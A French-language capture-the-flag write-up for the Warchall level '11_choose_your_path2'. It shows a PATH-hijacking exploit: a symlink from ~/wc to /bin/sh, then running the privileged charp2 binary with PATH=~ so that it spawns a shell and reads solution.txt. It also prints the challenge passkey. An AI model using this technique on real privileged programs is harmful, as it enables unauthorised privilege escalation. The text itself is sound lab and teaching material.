# 11_choose_your_patch2

1. création de liens symboliques pour exploiter les vulnérabilités: `ln -s /bin/sh ~/wc`
   
* Le fichier `~/wc` deviendra un lien symbolique pointant vers `/bin/sh`.
* Cela peut être utilisé pour créer un alias ou un raccourci vers le shell. Lorsqu'on exécute `~/wc`, cela équivaut à exécuter `/bin/sh`.
* `-s`: L'option qui indique à ln de créer un lien symbolique (au lieu d'un lien dur)

````sh
rantoo@warchall:/home/level/11_choose_your_path2$ ln -s /bin/sh ~/wc
````
2. Après, il faut trouver la solution possible pour lire le contenu de fichier `solution.txt`.
Donc, Ces commandes peuvent suffit pour effectuer notre objectif
````sh
rantoo@warchall:/home/level/11_choose_your_path2$ PATH=~ ./charp2 "/bin/cat solution.txt 1>&2"
````
* `PATH=~` : Cela modifie temporairement la variable d'environnement PATH pour inclure uniquement le répertoire courant, ce qui signifie que le système cherchera les exécutables uniquement dans le répertoire actuel.
* `./charp2` : C'est le fichier à executer dans le répertoire actuel
* `/bin/cat solution.txt`: Cela semble être une tentative d'exécuter la commande cat avec solution.txt
* `1>&2` :  Cela redirige la sortie standard (stdout) vers la sortie d'erreur standard (stderr). Cela signifie que si cat affiche quelque chose à la sortie standard, cela apparaîtra sur la sortie d'erreur standard.

````sh
Counting /bin/cat solution.txt 1>&2 ...
wc: 0: cannot open /bin/cat solution.txt 1>&2: No such file
Cannot scan! Sorry!
Dear challenger,

The original solution.txt of this challenge got lost.

However, here is the new solution: CodingIsDamnHard3.

I have no real idea what it takes to solve this challenge,
so you are obviously a better cracker than me.

Do not forget to vote the challenge!

 - gizmore
 Cannot scan! Sorry!
Floating point exception
````
The passkey is : **CodingIsDamnHard3**
